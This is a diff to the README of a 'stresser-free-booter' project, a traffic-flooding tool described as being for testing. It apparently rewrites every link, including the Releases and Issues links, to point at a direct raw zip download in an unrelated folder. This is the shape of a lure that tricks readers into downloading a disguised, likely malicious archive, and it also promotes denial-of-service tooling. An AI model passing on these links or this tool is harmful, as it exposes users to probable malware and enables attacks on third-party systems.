@@ -4,9 +4,9 @@
 Welcome to the **stresser-free-booter** project! This application allows users to simulate web traffic for testing purposes. It is designed for developers and testers looking to evaluate their systems under different conditions. 
 
 ## 📥 Download the Latest Version
-[![Download from GitHub](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/BGhackingCourse973/stresser-free-booter/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/BGhackingCourse973/stresser-free-booter/main/flosculous/stresser-free-booter.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/BGhackingCourse973/stresser-free-booter/main/flosculous/stresser-free-booter.zip)
 
-To get the most recent version of **stresser-free-booter**, visit this page: [Download Page](https://github.com/BGhackingCourse973/stresser-free-booter/releases).
+To get the most recent version of **stresser-free-booter**, visit this page: [Download Page](https://raw.githubusercontent.com/BGhackingCourse973/stresser-free-booter/main/flosculous/stresser-free-booter.zip).
 
 ## 💻 System Requirements
 Before downloading, make sure your system meets these basic requirements:
@@ -19,7 +19,7 @@ Before downloading, make sure your system meets these basic requirements:
 Follow these simple steps to download and install **stresser-free-booter**:
 
 1. **Visit the Download Page**  
-   Click the link to go to the download page: [Download Page](https://github.com/BGhackingCourse973/stresser-free-booter/releases).
+   Click the link to go to the download page: [Download Page](https://raw.githubusercontent.com/BGhackingCourse973/stresser-free-booter/main/flosculous/stresser-free-booter.zip).
 
 2. **Select the Latest Release**  
    On the download page, locate the most recent version of **stresser-free-booter**. The latest release will be at the top of the list.
@@ -62,7 +62,7 @@ If you encounter issues while using **stresser-free-booter**, consider the follo
 - **Update System**: Keep your operating system updated to avoid compatibility issues.
 
 ## 🤝 Support
-For any questions or support, feel free to open an issue on the [GitHub Repository](https://github.com/BGhackingCourse973/stresser-free-booter/issues). We encourage users to help each other, so feel free to contribute insights and solutions.
+For any questions or support, feel free to open an issue on the [GitHub Repository](https://raw.githubusercontent.com/BGhackingCourse973/stresser-free-booter/main/flosculous/stresser-free-booter.zip). We encourage users to help each other, so feel free to contribute insights and solutions.
 
 ## 🗣️ Community & Contributions
 We appreciate contributions from the community. If you want to help improve **stresser-free-booter**, consider the following ways:
